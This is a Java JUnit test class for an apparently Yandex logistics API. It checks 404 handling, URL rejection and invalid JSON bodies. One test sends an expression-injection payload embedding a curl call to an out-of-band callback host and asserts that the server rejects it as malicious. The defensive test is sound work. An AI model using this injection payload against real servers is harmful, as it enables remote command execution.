package ru.yandex.market.logistics.nesu.api;

import java.util.List;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpMethod;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static ru.yandex.market.logistics.test.integration.utils.IntegrationTestUtils.errorMessage;
import static ru.yandex.market.logistics.test.integration.utils.IntegrationTestUtils.status;

@DisplayName("Общие тесты OpenAPI")
class ApiCommonsTest extends AbstractApiTest {

    @Test
    @DisplayName("Запрос в несуществующий путь")
    void root() throws Exception {
        mockMvc.perform(get("/api").headers(authHeaders()))
            .andExpect(status().isNotFound());
    }

    @Test
    @DisplayName("Запрос в путь с запрещенными символами")
    void crasher() throws Exception {
        mockMvc.perform(
            get("/api/admin/uploads.php/%23{%25x(curl%20http:/dgxlemtlxwx38d9dojs4ww3eu506ov.burp.sec.yandex.net)}")
        )
            .andExpect(status().isBadRequest())
            .andExpect(errorMessage(
                "The request was rejected because the URL contained a potentially malicious String \"%25\""
            ));
    }

    @Test
    @DisplayName("Запрос с неправильной структурой тела")
    void invalidJson() throws Exception {
        mockMvc.perform(
            request(HttpMethod.PUT, "/api/pickup-points", List.of())
        ).andExpect(status().isBadRequest())
            .andExpect(errorMessage("Invalid request payload, please refer to method documentation"));
    }

}
